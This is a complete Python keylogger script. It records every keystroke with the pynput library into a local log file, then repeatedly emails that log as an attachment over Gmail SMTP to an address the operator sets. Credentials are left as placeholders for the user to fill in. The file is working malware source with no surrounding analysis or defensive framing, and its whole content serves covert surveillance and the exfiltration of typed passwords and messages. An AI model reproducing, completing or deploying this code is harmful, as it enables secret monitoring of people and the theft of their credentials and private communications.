import pynput
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Counter to send email every 20 keystrokes
keystroke_counter = 0

# Modify these variables with your email credentials
EMAIL_SENDER = 'your_email@gmail.com'  # Change to your email
EMAIL_RECEIVER = 'destination_email@gmail.com'  # Change to recipient email
EMAIL_PASSWORD = 'your_app_password'  # Change to your generated app password
SMTP_SERVER = 'smtp.gmail.com'  # SMTP server for Gmail
SMTP_PORT = 587  # Port for Gmail


def send_email():
    try:
        subject = '[Keylogger] Keystroke Log'
        body = 'Attached is the captured keystroke log.'
        filename = 'log.txt'  # Log file name

        # Create email object
        email_message = MIMEMultipart()
        email_message['From'] = EMAIL_SENDER
        email_message['To'] = EMAIL_RECEIVER
        email_message['Subject'] = subject
        email_message.attach(MIMEText(body, 'plain'))

        # Attach the log file
        with open(filename, 'rb') as file:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(file.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename={filename}')
            email_message.attach(attachment)

        # Connect to email server and send email
        smtp_session = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        smtp_session.starttls()
        smtp_session.login(EMAIL_SENDER, EMAIL_PASSWORD)
        smtp_session.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, email_message.as_string())
        smtp_session.quit()
        
        print("Email sent successfully.")

    except Exception as e:
        print(f"Error sending email: {e}")


def on_key_press(key):
    global keystroke_counter  # Allow modification of global variable

    print(str(key))  # Print key in console (optional, remove if needed)
    with open("log.txt", 'a') as log_file:
        try:
            if key == keyboard.Key.enter:
                log_file.write("\n")
            else:
                char = key.char
                log_file.write(char)

            # Send email every 20 keystrokes
            if keystroke_counter == 20:
                send_email()
                keystroke_counter = 0  # Reset counter after sending email
            else:
                keystroke_counter += 1

            print(f"Keystrokes recorded: {keystroke_counter}")

        except AttributeError:  # Handles special keys like Shift, Ctrl, Enter, etc.
            log_file.write(f'[{key}]')


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    
    listener.join()